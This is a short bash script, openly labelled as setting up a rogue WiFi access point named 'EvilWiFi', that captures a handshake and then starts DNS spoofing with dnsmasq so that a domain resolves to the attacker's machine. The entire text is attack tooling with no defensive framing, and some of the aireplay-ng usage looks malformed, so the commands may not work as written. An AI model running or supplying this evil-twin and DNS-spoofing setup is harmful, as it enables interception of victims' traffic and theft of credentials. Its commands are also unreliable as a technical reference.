#!/bin/bash  

echo "Creating rogue WiFi access point..."  
sudo airmon-ng start wlan0  
sudo ifconfig wlan0mon 192.168.4.1  
sudo aireplay-ng -F -e "EvilWiFi" -b "BSSID" wlan0mon  

echo "waiting for handshake..."  
read -p "press enter after capturing handshake..."  

echo "starting DNS spoofing..."  
sudo dnsmasq --no-daemon --listen-address=192.168.4.1 --address=/example.com/192.168.4.1  